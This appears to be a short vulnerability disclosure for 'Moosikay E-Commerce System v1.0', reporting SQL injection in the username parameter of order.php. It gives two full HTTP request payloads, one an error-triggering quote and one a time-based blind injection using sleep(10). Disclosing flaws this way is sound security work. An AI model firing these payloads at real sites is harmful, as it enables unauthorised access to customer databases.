# Moosikay - E-Commerce System v1.0 has SQL injection

BUG_Author:jidle

Vulnerability File: /Moosikay/order.php

POST parameter 'username' exists SQL injection vulnerability

Payload1: username=a'&password=b&login=

```
POST /Moosikay/order.php HTTP/1.1
Host: localhost
Content-Length: 29
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Moosikay/order.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm
Connection: close

username=a'&password=b&login=
```

An error occurred in the sql statement

![image](https://github.com/jidle123/picture/blob/main/error.png)

Payload2: username=a' and (select 1 FROM (select(sleep(10)))a)-- b&password=b&login=

```
POST /Moosikay/order.php HTTP/1.1
Host: localhost
Content-Length: 74
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Moosikay/order.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=8k72voo5t0276k7qbfjgmn7sjm
Connection: close

username=a' and (select 1 FROM (select(sleep(10)))a)-- b&password=b&login=
```

The response time of the server is 10 seconds

![image](https://github.com/jidle123/picture/blob/main/ten.png)
